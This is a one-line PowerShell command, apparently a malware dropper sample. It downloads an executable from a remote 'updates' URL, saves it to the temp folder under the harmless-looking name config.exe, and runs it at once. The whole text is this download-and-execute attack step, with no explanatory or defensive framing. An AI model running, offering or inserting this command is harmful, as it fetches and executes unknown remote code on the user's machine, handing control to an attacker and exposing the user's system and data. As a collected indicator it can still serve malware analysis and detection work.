
(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/eter.exe',"$env:TEMP\config.exe");Start-Process ("$env:TEMP\config.exe")

